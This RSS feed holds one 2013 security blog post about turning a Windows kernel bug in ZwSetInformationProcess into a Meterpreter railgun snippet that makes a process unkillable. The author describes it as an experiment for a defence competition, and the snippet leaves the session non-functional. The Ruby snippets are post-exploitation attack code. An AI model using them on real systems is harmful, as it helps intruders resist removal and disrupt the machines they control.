<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Room362</title>
    <link>https://room362.com/tags/incomplete/index.xml</link>
    <description>Recent content on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <atom:link href="https://room362.com/tags/incomplete/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Unkillable Processes</title>
      <link>https://room362.com/post/2013/2013-08-10-unkillable-processes</link>
      <pubDate>Sat, 10 Aug 2013 10:39:59 -0400</pubDate>
      
      <guid>https://room362.com/post/2013/2013-08-10-unkillable-processes</guid>
      <description>&lt;p&gt;Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process:
Blog post: &lt;a href=&#34;http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html&#34;&gt;http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Figured I&amp;rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.&lt;/p&gt;

&lt;p&gt;Started with the C code for the bug: &lt;a href=&#34;http://pastebin.com/QejGQXib&#34;&gt;http://pastebin.com/QejGQXib&lt;/a&gt; along with the only resource I could find about the actual function: &lt;a href=&#34;http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a&#34;&gt;http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I came up with this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.add_function(&#39;ntdll&#39;,&#39;ZwSetInformationProcess&#39;,&#39;DWORD&#39;,[
   [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessHandle&amp;quot;,&amp;quot;in&amp;quot;],
   [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessInformationClass&amp;quot;,&amp;quot;in&amp;quot;],
   [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessInformation&amp;quot;,&amp;quot;inout&amp;quot;],
   [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessInformationLength&amp;quot;,&amp;quot;in&amp;quot;],
])
processinfo = 0x8000F129
tproc = client.sys.process.open
tmem = tproc.memory.allocate(4)
tproc.memory.write(tmem,processinfo)
cpidhandle = client.railgun.kernel32.GetCurrentProcess()[&#39;return&#39;]
client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,tmem,0x4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.&lt;/p&gt;

&lt;p&gt;The result:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.add_function(&#39;ntdll&#39;,&#39;ZwSetInformationProcess&#39;,&#39;DWORD&#39;,[
     [&amp;quot;HANDLE&amp;quot;,&amp;quot;ProcessHandle&amp;quot;,&amp;quot;in&amp;quot;],
     [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessInformationClass&amp;quot;,&amp;quot;in&amp;quot;],
     [&amp;quot;PDWORD&amp;quot;,&amp;quot;ProcessInformation&amp;quot;,&amp;quot;inout&amp;quot;],
     [&amp;quot;DWORD&amp;quot;,&amp;quot;ProcessInformationLength&amp;quot;,&amp;quot;in&amp;quot;],
])
processinfo = 0x8000F129
cpidhandle = client.railgun.kernel32.GetCurrentProcess()[&#39;return&#39;]
client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,processinfo,0x4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which results in a process that you can&amp;rsquo;t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m curious if with some tweaking I can get it to act much like the KillMe.exe
&lt;a href=&#34;https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe&#34;&gt;https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Which continues to operate just fine after the modification happens.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>